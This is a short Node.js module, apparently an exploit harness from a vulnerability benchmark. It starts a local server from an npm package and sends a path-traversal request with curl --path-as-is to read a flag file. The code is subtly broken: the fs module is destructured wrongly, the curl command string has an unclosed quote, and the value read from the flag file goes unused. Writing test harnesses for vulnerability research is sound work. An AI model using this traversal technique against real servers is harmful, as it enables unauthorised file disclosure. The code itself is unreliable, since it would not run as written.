function exploitFunction(payload) {
  const { exec } = require("child_process");
  const { sleep } = require("sleep");

  const path = require("path"); // Import the path module
  const { fs } = require("fs"); // Import the fs module

  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const hostsFile = fs.readFileSync(pathToFlag).toString();

  const server = "node ./node_modules/welcomyzt/node.js";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    sleep.sleep(2);

    const attack_string = `curl -v --path-as-is "http://127.0.0.1:9987${payload()}`; // Use the payload function
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
        return;
      }
      return stdout;
    });
  });
}

module.exports = { exploitFunction };